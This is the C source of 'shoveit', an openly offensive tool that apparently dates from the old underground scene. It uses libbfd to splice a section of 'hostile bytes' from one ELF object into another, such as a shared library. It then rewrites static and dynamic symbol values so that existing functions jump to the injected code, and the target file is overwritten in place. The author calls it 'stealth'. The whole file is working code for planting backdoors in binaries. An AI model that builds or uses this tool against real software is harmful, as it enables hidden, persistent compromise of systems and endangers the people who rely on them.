/*
 *
 *	Coded by klog <klog@promisc.org>
 *
 *	libbfd relies on libiberty, so
 *	cc -c shoveit.c first, then cc shoveit.o -lbfd -liberty
 *
 *	shoveit <src_obj> <src_segment> <dst_obj> <dst_segment>
 * 		<orig_addr> <new_addr>
 *
 *	This tool will insert "src_segment" from "src_obj" into
 *	"dst_segment" of "dst_obj", and alter "symbol" to physical 
 *	value "value".
 *
 *	Portable, stealth, flexible.
 *	Have fun :)
 *
 *	NB: shoveit does *not* perform relocation
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <bfd.h>
#include <strings.h>
#include <linux/elf.h>

#define DYNSTAB ".dynsym"

#define nonfatal(s) {perror(s); return;}
#define fatal(s) {perror(s); exit(-1);}
#define bfd_nonfatal(s) {bfd_perror(s); return;}
#define bfd_fatal(s) {bfd_perror(s); exit(-1);}

char *input_section;
char *output_section;
char *input_filename;

static bfd *bd_bfd;
static sec_ptr bdsection;
static int bd_size = 0;
static int isdone = 0;
static int vma_offset = 0;

static long hooksym;
static long hookval;

void hook_dynstab(struct elf32_sym *symtab, bfd_size_type size)
{
	int symcount, i;

 	symcount = size/sizeof(asymbol);
	for(i=0;i<symcount;i++) {
		if (symtab[i].st_value == hooksym) 
			symtab[i].st_value = hookval;
	}
}

void setup_section(bfd *ibfd, sec_ptr isection, bfd *obfd)
{
  	struct section_list *p;
  	sec_ptr osection;
  	bfd_vma vma;
  	bfd_vma lma;
  	flagword flags;
  	char *err;
	int isdest = 0;

	if (!strcmp(output_section, isection->name)) isdest = 1;	

  	osection = bfd_make_section_anyway(obfd, 
		   bfd_section_name(ibfd, isection));

  	if (osection == NULL)
		fatal("making section");

	if (isdone) vma_offset = bd_size;

	if (isdest) {
  		if (!bfd_set_section_size(obfd, osection,
			bfd_section_size(ibfd, isection)+bd_size))
			bfd_fatal("setting size");
		isdone = 1;
	} else {
  		if (!bfd_set_section_size(obfd, osection,
			bfd_section_size(ibfd, isection)))
			bfd_fatal("setting size");		
	}

  	vma = bfd_section_vma (ibfd, isection) + vma_offset;
  	if (!bfd_set_section_vma(obfd, osection, vma))
		fatal("setting vma");

  	osection->lma = isection->lma + vma_offset;

  	if (bfd_set_section_alignment(obfd, osection,
		bfd_section_alignment(ibfd, isection)) == false)
		fatal("setting alignment");

  	flags = bfd_get_section_flags(ibfd, isection);
  	if (!bfd_set_section_flags(obfd, osection, flags))
		bfd_nonfatal("setting flags");

  	isection->output_section = osection;
  	isection->output_offset = 0;

  	if (!bfd_copy_private_section_data(ibfd, isection, obfd, osection))
		fatal("setting private data");

  	return;
}


void copy_section(bfd *ibfd, sec_ptr isection, bfd *obfd)
{
  	struct section_list *p;
  	arelent **relpp;
  	long relcount;
  	sec_ptr osection;
  	bfd_size_type size;
      	long relsize;
	int isdest = 0;
  	char **matching;

	if (!strcmp(output_section, isection->name)) isdest = 1;	

  	osection = isection->output_section;
  	size = bfd_get_section_size_before_reloc(isection);
  	if (size == 0 || osection == 0 || bd_size == 0)
    		return;

  	if (bfd_get_section_flags(ibfd, isection) & SEC_HAS_CONTENTS)
    	{
      		PTR memhunk = (PTR)xmalloc((unsigned) size);
      		if (!bfd_get_section_contents(ibfd, isection, 
				memhunk, (file_ptr) 0, size))
	  		nonfatal ("get_contents");

		if (isdest) {

	      		PTR bdhunk = (PTR)xmalloc((unsigned)size+bd_size);

			printf("Inserting %i hostile bytes into %s\n",
			bd_size, osection->name);

			bcopy(memhunk, bdhunk, size);

      			if (!bfd_get_section_contents(bd_bfd, bdsection, 
					bdhunk+size, 0, bd_size))
	  			bfd_nonfatal ("get_contents");

	      		if (!bfd_set_section_contents(obfd, osection, 
					bdhunk, (file_ptr) 0, size+bd_size))
	  			bfd_nonfatal("set_contents");
      			free (bdhunk);
		} else {
			if (!strcmp(osection->name, DYNSTAB)) {
				printf("Entering %s\n", osection->name);
				hook_dynstab(memhunk, size);
			}
      			if (!bfd_set_section_contents(obfd, osection, 
					memhunk, (file_ptr) 0, size))
	  			bfd_nonfatal("set_contents");
    		}
		free (memhunk);
	}
}


void copy_object(bfd *ibfd, bfd *obfd)
{
	long start;
  	long symcount, i;
      	long symsize;
	char **matching;
	asymbol **symtab;

  	start = bfd_get_start_address(ibfd);

  	if (!bfd_set_format (obfd, bfd_get_format(ibfd)))
      		nonfatal ("set_format");

	bd_bfd = bfd_openr(input_filename, "i586-pc-linux-gnulibc1");
	if (!bd_bfd) bfd_fatal("bfd_openr");
  	bfd_check_format_matches(bd_bfd, bfd_object, &matching);
	bdsection = bfd_get_section_by_name(bd_bfd, input_section);
	if (!bdsection) bfd_fatal("bfd_section");
	bd_size = bfd_section_size(bd_bfd, bdsection);
	if (!bd_size) bfd_fatal("section_size");

  	if (!bfd_set_start_address (obfd, start) || 
	    !bfd_set_file_flags(obfd,(bfd_get_file_flags(ibfd)
	    & bfd_applicable_file_flags(obfd))))
    	{
      		bfd_fatal("set_file_flags");
    	}

  	if (!bfd_set_arch_mach(obfd, bfd_get_arch (ibfd),
	    	bfd_get_mach (ibfd)))
    	{
      		fprintf (stderr,
	       		"Output file cannot represent architecture %s\n",
	       		bfd_printable_arch_mach (bfd_get_arch(ibfd),
					bfd_get_mach(ibfd)));
    	}
  	if (!bfd_set_format (obfd, bfd_get_format(ibfd)))
      		nonfatal ("set_format");

  	bfd_map_over_sections(ibfd, (void *)setup_section, obfd);

      	symsize = bfd_get_symtab_upper_bound(ibfd);
      	if (symsize < 0) nonfatal("get_symtab");

      	symtab = (asymbol **)xmalloc(symsize);
      	symcount = bfd_canonicalize_symtab(ibfd, symtab);
      	if (symcount < 0) nonfatal("canon_symtab");

	printf("Scanning %i symbols\n", symcount);
        for(i=0;i<symcount;i++)
                if (symtab[i]->value == hooksym) {
                        symtab[i]->value = hookval;     
			printf("Static symbol \"%s\" =+ %x\n",
				symtab[i]->name, symtab[i]->value);
			break;
	}       

  	bfd_set_symtab(obfd, symtab, symcount);

  	bfd_map_over_sections(ibfd, (void *)copy_section, obfd);

  	if (!bfd_copy_private_bfd_data (ibfd, obfd))
		fatal("bfd_copy_private_bfd_data");
}

main(int argc, char *argv[])  
{
  	bfd *ibfd;
  	char **matching;
	char *output_filename;

	input_filename = argv[1];
	input_section = argv[2];
	output_filename = argv[3];
	output_section = argv[4];
	hooksym = strtol(argv[5], NULL, 16);
	hookval = strtol(argv[6], NULL, 16);

	bfd_init();

  	ibfd = bfd_openr(output_filename, "i586-pc-linux-gnulibc1");
  	if (ibfd == NULL)
  	{
  		bfd_nonfatal("openr");
 	}

  	if (bfd_check_format_matches(ibfd, bfd_object, &matching))
  	{
      		bfd *obfd;

      		obfd = bfd_openw("newlib", "i586-pc-linux-gnulibc1");
	      	if (obfd == NULL) bfd_fatal("openw");

      		copy_object(ibfd, obfd);

	      	if (!bfd_close(obfd)) bfd_fatal("close");
      		if (!bfd_close(ibfd)) bfd_fatal("close");

 		execl("/bin/mv", "/bin/mv", "newlib", 
			output_filename, NULL);

    	} else {
      		bfd_fatal("format_matches");
	}
}
